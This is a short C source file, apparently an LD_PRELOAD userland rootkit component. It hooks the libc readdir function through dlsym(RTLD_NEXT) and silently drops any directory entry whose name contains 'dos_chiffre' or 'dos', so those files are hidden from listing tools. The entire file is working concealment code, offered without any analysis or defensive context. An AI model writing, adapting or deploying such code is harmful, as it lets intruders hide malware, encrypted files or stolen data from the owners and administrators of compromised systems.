#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

typedef struct dirent* (*orig_readdir_t)(DIR*);

struct dirent* readdir(DIR* dirp) {
    static orig_readdir_t orig_readdir = NULL;
    if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");
    
    struct dirent* dir;
    while ((dir = orig_readdir(dirp)) != NULL) {
        if (strstr(dir->d_name, "dos_chiffre") || 
            strstr(dir->d_name, "dos")) {
            continue; // Skip this entry
        }
        return dir;
    }
    return NULL;
}